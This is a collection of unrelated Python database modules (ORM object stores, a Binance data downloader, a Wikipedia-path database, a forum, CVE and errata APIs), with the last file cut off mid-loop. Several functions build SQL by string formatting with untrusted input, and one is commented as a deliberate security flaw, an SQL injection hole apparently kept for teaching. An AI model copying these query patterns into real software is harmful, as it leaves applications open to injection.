                    newConnection, pool, pool.__class__)

    def retrieveLastInsertId(self, conn, cur):
        try:
            # MySQLdb module 1.2.0 and later
            lastId = conn.insert_id()
        except AttributeError:
            # MySQLdb module 1.0.0 and earlier
            lastId = cur.insert_id()
        # The above is more efficient than this:
        # conn, cur = self.executeSQL('select last_insert_id();', conn)
        # id = cur.fetchone()[0]
        return lastId

    def dbapiModule(self):
        return MySQLdb

    def _executeSQL(self, cur, sql):                    
        try:
            cur.execute(sql)                    
        except MySQLdb.Warning:
            if not self.setting('IgnoreSQLWarnings', False):
                raise

    def sqlNowCall(self):
        return 'NOW()'


# Mixins

class StringAttr(object):

    def sqlForNonNone(self, value):
        """MySQL provides a quoting function for string -- this method uses it."""
        return "'" + MySQLdb.escape_string(value) + "'"


connectionPool = True
try:
    import psycopg2 as dbi  # psycopg2 version 2
    from psycopg2 import Warning, DatabaseError
    from psycopg2.extensions import QuotedString
except ImportError:
    try:
        import psycopg as dbi  # psycopg version 1
        from psycopg import Warning, DatabaseError
        from psycopg.extensions import QuotedString
    except ImportError:
        connectionPool = False
        import pgdb as dbi  # PyGreSQL
        from pgdb import Warning, DatabaseError
        def QuotedString(s):
            return "'%s'" % s.replace("\\", "\\\\").replace("'", "''")

from MiscUtils import NoDefault
from MiscUtils.MixIn import MixIn
from MiddleKit.Run.ObjectKey import ObjectKey
from MiddleObject import MiddleObject

from SQLObjectStore import SQLObjectStore, UnknownSerialNumberError


class PostgreSQLObjectStore(SQLObjectStore):
    """PostgresObjectStore implements an object store backed by a PostgreSQL database.

    The connection arguments passed to __init__ are:
      - host
      - user
      - passwd
      - port
      - unix_socket
      - client_flag

    You wouldn't use the 'db' argument, since that is determined by the model.
    """

    def augmentDatabaseArgs(self, args, pool=False):
        if not args.get('database'):
            args['database'] = self._model.sqlDatabaseName()

    def newConnection(self):
        args = self._dbArgs.copy()
        self.augmentDatabaseArgs(args)
        return self.dbapiModule().connect(**args)

    if connectionPool:

        # psycopg doesn't seem to work well with DBPool. Besides, it does
        # its own connection pooling internally, so DBPool is unnecessary.

        def setting(self, name, default=NoDefault):
            if name == 'SQLConnectionPoolSize':
                return 0
            return SQLObjectStore.setting(self, name, default)

        # psycopg doesn't like connections to be closed because of pooling

        def doneWithConnection(self, conn):
            pass

    def newCursorForConnection(self, conn, dictMode=False):
        return conn.cursor()

    def retrieveNextInsertId(self, klass):
        seqname = "%s_%s_seq" % (klass.name(), klass.sqlSerialColumnName())
        conn, curs = self.executeSQL("select nextval('%s')" % seqname)
        value = curs.fetchone()[0]
        assert value, "Didn't get next id value from sequence"
        return value

    def dbapiModule(self):
        return dbi

    def _executeSQL(self, cur, sql):                    
        try:
            cur.execute(sql)                    
        except Warning:
            if not self.setting('IgnoreSQLWarnings', False):
                raise

    def saveChanges(self):
        conn, cur = self.connectionAndCursor()
        try:
            SQLObjectStore.saveChanges(self)
        except DatabaseError:
            conn.rollback()
            raise
        except Warning:
            if not self.setting('IgnoreSQLWarnings', False):
                conn.rollback()
                raise
        conn.commit()

    def sqlCaseInsensitiveLike(self, a, b):
        return "%s ilike %s" % (a, b)

    def sqlNowCall(self):
        return 'now()'


class StringAttr(object):

    def sqlForNonNone(self, value):
        """psycopg provides a quoting function for string -- use it."""
        return "%s" % QuotedString(value)


class BoolAttr(object):

    def sqlForNonNone(self, value):
        if value:
            return 'TRUE'
        else:
            return 'FALSE'

import sqlite3 as sqlite

from SQLObjectStore import SQLObjectStore


class SQLiteObjectStore(SQLObjectStore):
    """SQLiteObjectStore implements an object store backed by a SQLite database.

    See the SQLite docs or the DB API 2.0 docs for more information:
      https://docs.python.org/2/library/sqlite3.html
      https://www.python.org/dev/peps/pep-0249/
    """

    def augmentDatabaseArgs(self, args, pool=False):
        if not args.get('database'):
            args['database'] = '%s.db' % self._model.sqlDatabaseName()

    def newConnection(self):
        kwargs = self._dbArgs.copy()
        self.augmentDatabaseArgs(kwargs)
        return self.dbapiModule().connect(**kwargs)

    def dbapiModule(self):
        return sqlite

    def dbVersion(self):
        return "SQLite %s" % sqlite.sqlite_version

    def _executeSQL(self, cur, sql):                    
        try:
            cur.execute(sql)                    
        except sqlite.Warning:
            if not self.setting('IgnoreSQLWarnings', False):
                raise
        except sqlite.OperationalError as e:
            if 'database is locked' in str(e):
                print ('Please consider installing a newer SQLite version'
                    ' or increasing the timeout.')
            raise

    def sqlNowCall(self):
        return "datetime('now')"


class StringAttr(object):

    def sqlForNonNone(self, value):
        return "'%s'" % value.replace("'", "''")

# LOAD LIBRARIES & FILES

# load libraries
from binance.client import Client
import configparser
import sqlite3


# load functions
def getlist(option, sep=',', chars=None):
    """Return a list from a ConfigParser option. By default,
       split on a comma and strip whitespaces."""
    return [ chunk.strip(chars) for chunk in option.split(sep) ]


# READ FILES

# read credentials
configParser = configparser.ConfigParser()
configParser.read(r'credentials/API-key')

api_key = configParser.get('credentials', 'api_key')
api_sec = configParser.get('credentials', 'api_secret')


# read config
configParser.read(r'config.txt')

db_path = configParser.get('config', 'db_path')
verbose = configParser.get('config', 'verbose')
symbols = getlist(configParser.get('symbols', 'symbol_list'))
intervals = getlist(configParser.get('intervals', 'interval_list'))
time_start = configParser.get('time', 'time_start')
time_end = configParser.get('time', 'time_end')


# create timestamps for beginning and now
if time_start == 'beginning':
    time_start = 'January 1, 2000'


# SET UP DATABASE CONNECTION AND BINANCE CLIENT

# connect to database
db_con = sqlite3.connect(db_path)

# cet up binance client
client = Client(api_key, api_sec)


# GET DATA FOR ALL SYMBOLS AND INTERVALS

# Loop over every symbol and every interval. Download historical data for each combination from binance.com which is not
# already in the database and write it to the database
for symbol in symbols:
    for interval in intervals:

        # define name of table in database
        table_name = (symbol + '_' + interval, )                    

        # check if table already exists
        with db_con:
            cur = db_con.cursor()
            cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name=?", table_name)                    
            if cur.fetchone() is None:
                table_exists = False
            else:
                table_exists = True

        # if table does not exist yet, create it and download all historical data.
        # Note: the SQL-command 'IF NOT EXISTS' has no use here since get_historical_klines()
        # cannot be used to update existing data
        if not table_exists:
            # create table
            with db_con:
                cur = db_con.cursor()
                cur.execute('CREATE TABLE {}_{}('.format(symbol, interval) +                    
                            't_open DATETIME, ' +
                            'open FLOAT, ' +
                            'high FLOAT, ' +
                            'low FLOAT, ' +
                            'close FLOAT, ' +
                            'vol FLOAT, ' +
                            't_close DATETIME, ' +
                            'u_vol FLOAT, ' +
                            'no_trds INT, ' +
                            'tbBav FLOAT, ' +
                            'tbQav FLOAT)')

            # download data
            output = client.get_historical_klines(symbol=symbol,
                                                  interval=interval,
                                                  start_str=time_start,
                                                  end_str=time_end)

            # write downloaded data to database
            with db_con:
                cur = db_con.cursor()
                for x in range(0, len(output)):
                    cur.execute('INSERT INTO {}_{} '.format(symbol, interval) +                    
                                'VALUES({}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {})'.format(output[x][0],                    
                                                                                            output[x][1],                    
                                                                                            output[x][2],                    
                                                                                            output[x][3],                    
                                                                                            output[x][4],                    
                                                                                            output[x][5],                    
                                                                                            output[x][6],                    
                                                                                            output[x][7],                    
                                                                                            output[x][8],                    
                                                                                            output[x][9],                    
                                                                                            output[x][10]))                    

            # print process to console if verbose mode is enabled
            if verbose:
                print('Symbol {}, interval {}: Historical data has been downloaded and saved to database'.format(symbol, interval))                    

        # if table already exists and verbose mode is enabled print that to console
        elif table_exists & (verbose == 'True'):
            print('Symbol {}, interval {}: Table already exists in database. No data has been downloaded.'.format(symbol, interval))                    

# -*- coding: utf-8 -*-
import pymysql
import db_config


class DBHelper:
    
    def connect(self, database="crimemap"):
        return pymysql.connect(host='localhost',
                    user=db_config.db_user,
                    password=db_config.db_password,
                    db=database)

    def get_all_inputs(self):
        connection = self.connect()
        try:
            query = "SELECT description FROM crimes;"
            with connection.cursor() as cursor:
                cursor.execute(query)                    
            return cursor.fetchall()
        finally:
            connection.close()

    def add_input(self, data):
        connection = self.connect()
        try:
            # The following introduces a deliberate security flaw
            query = "INSERT INTO crimes (description) VALUES ('{}');".format(data)                    
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                connection.commit()
        finally:
            connection.close()

    def clear_all(self):
        connection = self.connect()
        try:
            query = "DELETE FROM crimes;"
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                connection.commit()
        finally:
            connection.close()
    




import sqlite3

mock_database_filename = 'sdow.sqlite'

print '[INFO] Creating mock database: {0}'.format(mock_database_filename)

conn = sqlite3.connect(mock_database_filename)

conn.execute('DROP TABLE IF EXISTS pages')
conn.execute('CREATE TABLE pages(id INTEGER PRIMARY KEY, name TEXT)')

for page_id in range(1, 101):
  page_name = '{0}_{1}'.format(page_id, page_id)                    
  conn.execute('INSERT INTO pages VALUES ({0}, "{1}")'.format(page_id, page_name))

conn.execute('DROP TABLE IF EXISTS redirects')
conn.execute('CREATE TABLE redirects(from_id INTEGER PRIMARY KEY, to_id INTEGER)')

for page_id in range(50, 60):
  conn.execute('INSERT INTO redirects VALUES ({0}, {1})'.format(page_id, page_id + 10))

conn.execute('DROP TABLE IF EXISTS links')
conn.execute('CREATE TABLE links(from_id INTEGER, to_id INTEGER, PRIMARY KEY (from_id, to_id)) WITHOUT ROWID;')

conn.execute('INSERT INTO links VALUES (1, 2)')
conn.execute('INSERT INTO links VALUES (1, 4)')
conn.execute('INSERT INTO links VALUES (1, 5)')
conn.execute('INSERT INTO links VALUES (1, 10)')
conn.execute('INSERT INTO links VALUES (2, 1)')
conn.execute('INSERT INTO links VALUES (2, 3)')
conn.execute('INSERT INTO links VALUES (2, 10)')
conn.execute('INSERT INTO links VALUES (3, 4)')
conn.execute('INSERT INTO links VALUES (3, 11)')
conn.execute('INSERT INTO links VALUES (4, 1)')
conn.execute('INSERT INTO links VALUES (4, 6)')
conn.execute('INSERT INTO links VALUES (4, 9)')
conn.execute('INSERT INTO links VALUES (5, 6)')
conn.execute('INSERT INTO links VALUES (7, 8)')
conn.execute('INSERT INTO links VALUES (8, 7)')
conn.execute('INSERT INTO links VALUES (9, 3)')
conn.execute('INSERT INTO links VALUES (11, 12)')
conn.execute('INSERT INTO links VALUES (13, 12)')
conn.execute('INSERT INTO links VALUES (15, 16)')
conn.execute('INSERT INTO links VALUES (15, 17)')
conn.execute('INSERT INTO links VALUES (16, 17)')
conn.execute('INSERT INTO links VALUES (16, 18)')
conn.execute('INSERT INTO links VALUES (17, 18)')
conn.execute('INSERT INTO links VALUES (18, 19)')
conn.execute('INSERT INTO links VALUES (19, 20)')
conn.execute('INSERT INTO links VALUES (21, 20)')
conn.execute('INSERT INTO links VALUES (22, 20)')

conn.commit()

print '[INFO] Successfully created mock database: {0}'.format(mock_database_filename)

'''
Wrapper for connecting to the SDOW database.
'''

import os.path
import sqlite3
import sdow.helpers as helpers
from sdow.breadth_first_search import breadth_first_search


class Database():
  '''
  Wrapper for connecting to the SDOW database.
  '''
  def __init__(self, sqlite_filename):
    if not os.path.isfile(sqlite_filename):
      raise IOError('Specified SQLite file "{0}" does not exist.'.format(sqlite_filename))

    self.conn = sqlite3.connect(sqlite_filename)
    self.cursor = self.conn.cursor()

    # TODO: measure the performance impact of this
    self.cursor.arraysize = 1000

  def __del__(self):
    self.conn.close()

  def fetch_page_id(self, page_name):
    '''
    Returns the page ID corresponding to the provided page name.

    Args:
      page_name: The page name whose ID to fetch.

    Returns:
      int: The page ID corresponding to the provided page name.

    Raises:
      ValueError: If the provided page name is invalid or does not exist.
    '''
    helpers.validate_page_name(page_name)

    sanitized_page_name = page_name.replace(' ', '_')

    print 'sanitized_page_name: {0}'.format(sanitized_page_name)                    

    query = 'SELECT id FROM pages WHERE name="{0}"'.format(sanitized_page_name)                    
    self.cursor.execute(query)                    

    page_id = self.cursor.fetchone()

    if not page_id:
      raise ValueError('Invalid page name {0} provided. Page name does not exist.'.format(page_name))

    return page_id[0]


  def fetch_page_name(self, page_id):
    '''
    Returns the page name corresponding to the provided page ID.

    Args:
      page_id: The page ID whose ID to fetch.

    Returns:
      str: The page name corresponding to the provided page ID.

    Raises:
      ValueError: If the provided page ID is invalid or does not exist.
    '''
    helpers.validate_page_id(page_id)

    query = 'SELECT name FROM pages WHERE id="{0}"'.format(page_id)                    
    self.cursor.execute(query)                    

    page_name = self.cursor.fetchone()

    if not page_name:
      raise ValueError('Invalid page ID "{0}" provided. Page ID does not exist.'.format(page_id))

    return page_name[0].encode('utf-8').replace('_', ' ')


  def fetch_redirected_page_id(self, from_page_id):
    '''
    If the provided page ID is a redirect, returns the ID of the page to which it redirects.
    Otherwise, returns None.

    Args:
      from_page_id: The page ID whose redirected page ID to fetch.

    Returns:
      int: The ID of the page to which the provided page ID redirects.
      OR
      None: If the provided page ID is not a redirect.

    Raises:
      ValueError: If the provided page ID is invalid.
    '''
    helpers.validate_page_id(from_page_id)

    query = 'SELECT to_id FROM redirects WHERE from_id="{0}"'.format(from_page_id)                    
    self.cursor.execute(query)                    

    to_page_id = self.cursor.fetchone()

    return to_page_id and to_page_id[0]

  def compute_shortest_paths(self, from_page_id, to_page_id):
    '''
    Returns a list of page IDs indicating the shortest path between the from and to page IDs.

    Args:
      from_page_id: The ID corresponding to the page at which to start the search.
      to_page_id: The ID corresponding to the page at which to end the search.

    Returns:
      [[int]]: A list of integer lists corresponding to the page IDs indicating the shortest path
               between the from and to page IDs.

    Raises:
      ValueError: If either of the provided page IDs are invalid.
    '''
    helpers.validate_page_id(from_page_id)
    helpers.validate_page_id(to_page_id)

    return breadth_first_search(from_page_id, to_page_id, self)

  def fetch_forwards_links(self, page_ids):
    '''
    Returns a list of tuples of page IDs representing forwards links from the list of provided page
    IDs to other pages.

    Args:
      page_ids: The page IDs whose forwards links to fetch.

    Returns:
      [(int, int)]: A lists of integer tuples representing forwards links from the list of provided
                    page IDs to other pages.
    '''
    return self.fetch_links_helper(page_ids, 'from_id')

  def fetch_backwards_links(self, page_ids):
    '''
    Returns a list of tuples of page IDs representing backwards links from the list of provided page
    IDs to other pages.

    Args:
      page_ids: The page IDs whose backwards links to fetch.

    Returns:
      [(int, int)]: A lists of integer tuples representing backwards links from the list of provided
                    page IDs to other pages.
    '''
    return self.fetch_links_helper(page_ids, 'to_id')

  def fetch_links_helper(self, page_ids, to_id_or_from_id):
    '''
    Helper function which handles duplicate logic for fetch_forwards_links() and
    fetch_backwards_links().

    Args:
      page_ids: The page IDs whose links to fetch.
      to_id_or_from_id: String which indicates whether to fetch forwards ("from_id") or backwards
                        ("to_id") links.

    Returns:
      [(int, int)]: A lists of integer tuples representing links from the list of provided page IDs
                    to other pages.
    '''

    query = 'SELECT from_id, to_id FROM links WHERE {0} IN {1}'.format(to_id_or_from_id, page_ids)                    

    #results = []
    #for row in self.cursor.execute(query):                    
    #  results.append(row)

    # TODO: measure the performance impact of this versus just appending to an array (above) or
    # just returning the cursor (not yet implemented)
    self.cursor.execute(query)                    

    return self.cursor.fetchall()


# "Database code" for the DB Forum.

import psycopg2

DBNAME = "forum"

def get_posts():
  """Return all posts from the 'database', most recent first."""
  db = psycopg2.connect(database=DBNAME)
  c = db.cursor()
  c.execute("select content,time from posts order by time desc")
  return c.fetchall()
  db.close()

def add_post(content):
  """Add a post to the 'database' with the current timestamp."""
  db = psycopg2.connect(database=DBNAME)
  c = db.cursor()
  c.execute("insert into posts values('%s')" % content)                    
  db.commit()
  db.close()

"""
Module contains functions and CVE class for returning data from DB
"""


class CVE:
    """
    Class to hold CVE attributes
    """
    cve_cwe_map = None

    def __init__(self, cve_entry, column_names):
        for col_name in column_names:
            setattr(self, col_name, cve_entry[column_names.index(col_name)])
        self.cwe = self.associate_cwes()

    def associate_cwes(self):
        """
        Assigns cve to cwe and creates a list
        :return:
        """
        cwe_map = []
        if CVE.cve_cwe_map is not None:
            cwe_map = [item[1] for item in CVE.cve_cwe_map if self.get_val("cve.id") == item[0]]
        return cwe_map

    def get_val(self, attr_name):
        """
        Return CVE attribute or None
        :param attr_name: attr_name
        :return: attribute
        """
        value = None
        if attr_name in vars(self):
            value = getattr(self, attr_name)
        return value

class CveAPI:
    def __init__(self, cursor):
        self.cursor = cursor

    def process_list(self, data):
        """
        This method returns details for given set of CVEs.

        :param data: data obtained from api, we're interested in data["cve_list"]

        :returns: list of dictionaries containing detailed information for given cve list}

        """

        cves_to_process = data["cve_list"]
        cves_to_process = filter(None, cves_to_process)
        answer = {}
        if not cves_to_process:
            return answer

        # Select all cves in request
        column_names = ["cve.id", "redhat_url", "secondary_url", "cve.name", "severity.name", "published_date",                    
                        "modified_date", "iava", "description"]                    
        cve_query = "SELECT %s from cve" % ', '.join(column for column in column_names)                    
        cve_query = cve_query + " LEFT JOIN severity ON severity_id = severity.id"                    
        cve_query = cve_query + " WHERE cve.name IN %s"                    
        self.cursor.execute(cve_query, [tuple(cves_to_process)])
        cves = self.cursor.fetchall()
        cwe_map = self.get_cve_cwe_map([cve[column_names.index("cve.id")] for cve in cves])  # generate cve ids
        CVE.cve_cwe_map = cwe_map
        cve_list = []
        for cve_entry in cves:
            cve = CVE(cve_entry, column_names)
            cve_list.append(cve)

        return self.construct_answer(cve_list)


    def get_cve_cwe_map(self, ids):
        """
        For givers CVE ids find CWE in DB
        :param ids: CVE ids
        :return: cve_cwe mapping
        """
        if not ids:
            return []
        query = "SELECT cve_id, cwe.name, cwe.link FROM cve_cwe map JOIN cwe ON map.cwe_id = cwe.id WHERE map.cve_id IN %s"                    
        self.cursor.execute(query, [tuple(ids)])
        return self.cursor.fetchall()


    @staticmethod
    def construct_answer(cve_list):
        """
        Final dictionary generation
        :param cve_list: which cves to show
        :return: JSON ready dictionary
        """
        response = {}
        for cve in cve_list:
            response[cve.get_val("cve.name")] = {
                "redhat_url": cve.get_val("redhat_url"),
                "secondary_url": cve.get_val("secondary_url"),
                "synopsis": cve.get_val("cve.name"),
                "impact": cve.get_val("severity.name"),
                "public_date": cve.get_val("published_date"),
                "modified_date": cve.get_val("modified_date"),
                "iava": cve.get_val("iava"),
                "cwe_list": cve.get_val("cwe"),
                "description": cve.get_val("description"),
            }
        return response

"""
Module contains classes for returning errata data from DB
"""

class Errata:
    """
    Class to hold Erratum attributes
    """

    def __init__(self, id, name, synopsis, severity, description, solution, issued, updated):
        setattr(self, "name", name)
        setattr(self, "id", id)
        mydict = {}
        mydict["type"] = None
        mydict["issued"] = str(issued)
        mydict["synopsis"] = synopsis
        mydict["description"] = description
        mydict["solution"] = solution
        mydict["severity"] = severity
        mydict["summary"] = None
        mydict["updated"] = str(updated)
        mydict["url"] = "https://access.redhat.com/errata/%s" % name
        mydict["bugzilla_list"] = []
        mydict["cve_list"] = []
        mydict["package_list"] = []
        mydict["reference_list"] = []
        setattr(self, "mydict", mydict)

    def set_cve_names(self, cve_name_list):
        mydict = self.get_val("mydict")
        mydict["cve_list"] = cve_name_list

    def set_packages(self, package_list):
        mydict = self.get_val("mydict")
        mydict["package_list"] = package_list

    def get_val(self, attr_name):
        """
        Return Erratum attribute or None
        :param attr_name: attr_name
        :return: attribute
        """
        value = None
        if attr_name in vars(self):
            value = getattr(self, attr_name)
        return value

class ErrataAPI:
    def __init__(self, cursor):
        self.cursor = cursor

    def get_cve_names_for_erratum_id(self, id):
        """
        Get the list of cves for the given erratum id
        """
        cve_query = "SELECT name FROM cve"                    
        cve_query += " JOIN errata_cve ON cve_id = cve.id"                    
        cve_query += " WHERE errata_cve.errata_id = %s" % str(id)                    
        self.cursor.execute(cve_query)                    
        cve_names = self.cursor.fetchall()
        cve_name_list = []
        for cve_name in cve_names:
            cve_name_list.append(cve_name[0])
        return cve_name_list

    @staticmethod
    def build_package_name(name, epoch, version, release, arch):
        """
        Build a package name from the separate NEVRA parts
        """
        package_name = name + "-"
        if int(epoch) > 0:
            package_name += "%s:" % epoch
        package_name += "%s-%s.%s" % (version, release, arch)
        return package_name

    def get_package_list_for_erratum_id(self, id):
        """
        Get the list of packages for the given erratum id
        """
        pkg_query = "SELECT package.name, evr.epoch, evr.version, evr.release, arch.name"                    
        pkg_query += " FROM pkg_errata"                    
        pkg_query += " JOIN package ON package.id = pkg_errata.pkg_id"                    
        pkg_query += " JOIN evr ON evr.id = package.evr_id"                    
        pkg_query += " JOIN arch ON arch.id = package.arch_id"                    
        pkg_query += " WHERE pkg_errata.errata_id = %s" % str(id)                    
        self.cursor.execute(pkg_query)                    
        result = self.cursor.fetchall()
        package_list = []
        for name, epoch, version, release, arch in result:
            package_list.append(self.build_package_name(name, epoch, version, release, arch))
        return package_list

    def process_list(self, data):
        """
        This method returns details for given set of Errata.

        :param cursor: psycopg2 connection cursor
        :param data: data obtained from api, we're interested in data["errata_list"]

        :returns: dictionary containing detailed information for given errata list}

        """

        errata_to_process = data["errata_list"]
        errata_to_process = filter(None, errata_to_process)
        answer = {}

        if not errata_to_process:
            return answer

        # Select all errata in request
        errata_query = "SELECT errata.id, errata.name, synopsis, severity.name, description,"
        errata_query += " solution, issued, updated"                    
        errata_query += " FROM errata"                    
        errata_query += " LEFT JOIN severity ON severity_id = severity.id"                    
        errata_query += " WHERE errata.name IN %s"                    
        self.cursor.execute(errata_query, [tuple(errata_to_process)])
        errata = self.cursor.fetchall()

        erratum_list = []
        for id, name, synopsis, severity, description, solution, issued, updated in errata:
            new_erratum = Errata(id, name, synopsis, severity, description, solution, issued, updated)
            new_erratum.set_cve_names(self.get_cve_names_for_erratum_id(id))
            new_erratum.set_packages(self.get_package_list_for_erratum_id(id))
            erratum_list.append(new_erratum)

        errata_dict = {}
        for e in erratum_list:
            errata_dict[e.get_val("name")] = e.get_val("mydict")
        answer["errata_list"] = errata_dict
        return answer

#!/usr/bin/python -u


def split_filename(filename):
    """
    Pass in a standard style rpm fullname

    Return a name, version, release, epoch, arch, e.g.::
        foo-1.0-1.i386.rpm returns foo, 1.0, 1, 0, i386
        bar-1:9-123a.ia64.rpm returns bar, 9, 123a, 1, ia64
    """

    is_epoch = True if filename.find(':') != -1 else False

    if filename[-4:] == '.rpm':
        filename = filename[:-4]

    arch_index = filename.rfind('.')
    arch = filename[arch_index + 1:]

    rel_index = filename[:arch_index].rfind('-')
    rel = filename[rel_index + 1:arch_index]

    if is_epoch:
        ver_index = filename[:rel_index].rfind(':')
    else:
        ver_index = filename[:rel_index].rfind('-')
    ver = filename[ver_index + 1:rel_index]


    if is_epoch:
        epoch_index = filename[:ver_index].rfind('-')
        epoch = filename[epoch_index + 1:ver_index]
    else:
        epoch_index = ver_index
        epoch = '0'

    name = filename[:epoch_index]
    return name, ver, rel, epoch, arch


class UpdatesAPI:
    def __init__(self, cursor):
        self.cursor = cursor

    def process_list(self, data):
        """
        This method is looking for updates of a package, including name of package to update to,
        associated erratum and repository this erratum is from.

        :param packages_to_process: list of package to find updates for every of them

        :returns: updates for a package in format of list of dictionaries {'package': <p_name>, 'erratum': <e_name>,
        'repository': <r_name>}

        """

        packages_to_process = data['package_list']
        auxiliary_dict = {}
        answer = {}

        if not packages_to_process:
            return answer

        provided_repo_ids = None
        provided_repo_names = None

        if 'repository_list' in data:
            provided_repo_names = data['repository_list']
            provided_repo_ids = []
            self.cursor.execute("select id from repo where name in %s;", [tuple(provided_repo_names)])
            for id_tuple in self.cursor.fetchall():
                for id in id_tuple:
                    provided_repo_ids.append(id)

        # Select all evrs and put them into dictionary
        self.cursor.execute("SELECT id, epoch, version, release from evr")
        evrs = self.cursor.fetchall()
        evr2id_dict = {}
        id2evr_dict = {}
        for id, e, v, r in evrs:
            key = e + ':' + v + ':' + r
            evr2id_dict[key] = id
            id2evr_dict[id] = {'epoch': e, 'version': v, 'release': r}

        # Select all archs and put them into dictionary
        self.cursor.execute("SELECT id, name from arch")
        archs = self.cursor.fetchall()
        arch2id_dict = {}
        id2arch_dict = {}
        for id, name in archs:
            arch2id_dict[name] = id
            id2arch_dict[id] = name

        packages_names = []
        packages_evrids = []

        for pkg in packages_to_process:
            pkg = str(pkg)

            # process all packages form input
            if pkg not in auxiliary_dict:
                n, v, r, e, a = split_filename(str(pkg))
                auxiliary_dict[pkg] = {}  # create dictionary with aux data for pkg

                evr_key = e + ':' + v + ':' + r
                if evr_key in evr2id_dict:
                    packages_names.append(n)
                    auxiliary_dict[pkg][n] = []

                    evr_id = evr2id_dict[evr_key]
                    packages_evrids.append(evr_id)
                    auxiliary_dict[pkg]['evr_id'] = evr_id
                    auxiliary_dict[pkg]['arch_id'] = arch2id_dict[a]
                    auxiliary_dict[pkg]['repo_id'] = []
                    auxiliary_dict[pkg]['pkg_id'] = []
                    auxiliary_dict[pkg]['update_id'] = []

        # Select all packages with given evrs ids and put them into dictionary
        self.cursor.execute("select id, name, evr_id, arch_id from package where evr_id in %s;",  [tuple(packages_evrids)])
        packs = self.cursor.fetchall()
        nevra2pkg_id = {}
        for id, name, evr_id, arch_id in packs:
            key = name + ':' + str(evr_id) + ':' + str(arch_id)
            if key not in nevra2pkg_id:
                nevra2pkg_id[key] = [id]
            else:
                nevra2pkg_id[key].append(id)

        pkg_ids = []
        for pkg in auxiliary_dict.keys():
            n, v, r, e, a = split_filename(str(pkg))

            try:
                key = str(n + ':' + str(auxiliary_dict[pkg]['evr_id']) + ':' + str(auxiliary_dict[pkg]['arch_id']))
                pkg_ids.extend(nevra2pkg_id[key])
                auxiliary_dict[pkg]['pkg_id'].extend(nevra2pkg_id[key])
            except KeyError:
                pass

        # Select all repo_id and add mapping to package id
        self.cursor.execute("select pkg_id, repo_id from pkg_repo where pkg_id in %s;", [tuple(pkg_ids)])
        pack_repo_ids = self.cursor.fetchall()
        pkg_id2repo_id = {}

        repo_ids = []

        for pkg_id, repo_id in pack_repo_ids:
            repo_ids.append(repo_id)

            if pkg_id in pkg_id2repo_id:
                pkg_id2repo_id[pkg_id].append(repo_id)
            else:
                pkg_id2repo_id[pkg_id] = [repo_id]

        for pkg in auxiliary_dict.keys():
                try:
                    for pkg_id in auxiliary_dict[pkg]['pkg_id']:
                        auxiliary_dict[pkg]['repo_id'].extend(pkg_id2repo_id[pkg_id])
                except KeyError:
                    pass

        self.cursor.execute("select name, id from package where name in %s;", [tuple(packages_names)])
        sql_result = self.cursor.fetchall()
        names2ids = {}
        for name, id in sql_result:

            if name in names2ids:
                names2ids[name].append(id)
            else:
                names2ids[name] = [id]

        for pkg in auxiliary_dict.keys():
            n, v, r, e, a = split_filename(str(pkg))

            try:
                auxiliary_dict[pkg][n].extend(names2ids[n])
            except KeyError:
                pass

        update_pkg_ids = []

        for pkg in auxiliary_dict:
            n, v, r, e, a = split_filename(str(pkg))

            if n in auxiliary_dict[pkg] and auxiliary_dict[pkg][n]:
                sql = """                    
                select package.id from package join evr on package.evr_id = evr.id where package.id in %s and evr.evr > (select evr from evr where id = %s);                    
                """ % ('%s', str(auxiliary_dict[pkg]['evr_id']))                    

                self.cursor.execute(sql, [tuple(auxiliary_dict[pkg][n])])                    

                for id in self.cursor.fetchall():
                    auxiliary_dict[pkg]['update_id'].append(id[0])
                    update_pkg_ids.append(id[0])

        # Select all info about repos
        self.cursor.execute("select id, name, url from repo where id in %s;", [tuple(repo_ids)])
        all_repos = self.cursor.fetchall()
        repoinfo_dict = {}
        for id, name, url in all_repos:
            repoinfo_dict[id] = {'name': name, 'url': url}

        # Select all info about pkg_id to repo_id
        self.cursor.execute("select pkg_id, repo_id from pkg_repo where pkg_id in %s;", [tuple(update_pkg_ids)])
        all_pkg_repos = self.cursor.fetchall()
        pkg_id2repo_id = {}
        for pkg_id, repo_id in all_pkg_repos:

            if pkg_id not in pkg_id2repo_id:
                pkg_id2repo_id[pkg_id] = [repo_id]
            else:
                pkg_id2repo_id[pkg_id].append(repo_id)

        # Select all info about pkg_id to errata_id
        self.cursor.execute("select pkg_id, errata_id from pkg_errata where pkg_id in %s;", [tuple(update_pkg_ids)])
        all_pkg_errata = self.cursor.fetchall()
        pkg_id2errata_id = {}
        all_errata = []
        for pkg_id, errata_id in all_pkg_errata:
            all_errata.append(errata_id)
            if pkg_id not in pkg_id2errata_id:
                pkg_id2errata_id[pkg_id] = [errata_id]
            else:
                pkg_id2errata_id[pkg_id].append(errata_id)

        # Select all info about errata
        self.cursor.execute("SELECT id, name from errata where id in %s;", [tuple(all_errata)])
        errata = self.cursor.fetchall()
        id2errata_dict = {}
        all_errata_id = []
        for id, name in errata:
            id2errata_dict[id] = name
            all_errata_id.append(id)

        self.cursor.execute("SELECT errata_id, repo_id from errata_repo where errata_id in %s;", [tuple(all_errata_id)])
        sql_result = self.cursor.fetchall()
        errata_id2repo_id = {}
        for errata_id, repo_id in sql_result:
            if errata_id not in errata_id2repo_id:
                errata_id2repo_id[errata_id] = [repo_id]
            else:
                errata_id2repo_id[errata_id].append(repo_id)

        # Select all info about packages
        self.cursor.execute("SELECT id, name, evr_id, arch_id from package where id in %s;", [tuple(update_pkg_ids)])
        packages = self.cursor.fetchall()
        pkg_id2full_name = {}
        pkg_id2arch_id = {}
        for id, name, evr_id, arch_id in packages:
            full_rpm_name = name + '-'
            if id2evr_dict[evr_id]['epoch'] != '0':
                full_rpm_name += id2evr_dict[evr_id]['epoch'] + ':'
            full_rpm_name += id2evr_dict[evr_id]['version'] + '-' + id2evr_dict[evr_id]['release'] + '.' + id2arch_dict[arch_id]

            pkg_id2full_name[id] = full_rpm_name
            pkg_id2arch_id[id] = arch_id

        for pkg in auxiliary_dict:
            answer[pkg] = []

            if 'update_id' not in auxiliary_dict[pkg]:
                continue

            for upd_pkg_id in auxiliary_dict[pkg]['update_id']:
                # FIXME: use compatibility tables instead of exact matching
                if auxiliary_dict[pkg]['arch_id'] == pkg_id2arch_id[upd_pkg_id]:
                    for r_id in pkg_id2repo_id[upd_pkg_id]:
                        # check if update package in the same repo with original one
                        # and if the list of repositories for updates is provided, also check repo id in this list
